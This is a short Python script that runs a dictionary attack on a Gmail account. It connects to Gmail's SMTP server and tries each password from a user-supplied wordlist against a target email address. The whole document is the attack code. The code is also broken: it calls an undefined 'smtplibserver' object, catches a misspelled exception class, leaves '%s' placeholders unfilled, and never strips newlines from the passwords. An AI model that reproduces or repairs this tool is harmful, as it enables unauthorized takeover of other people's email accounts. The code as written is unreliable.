#by sid hocine from algeria
import smtplib
smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()


user  = raw_input("enter your email : ")
passwfile = raw_input("enter the list passwd : ")
passwfile = open(passwfile,"r")

for password in passwfile:
         try :
                smtplibserver.login(user,password)
                print (" [+] password is fond===> %s")
                break;
         except smtplib.SMTPAuthenticatoinError:
                print(" [+] password is not fond====> %s")


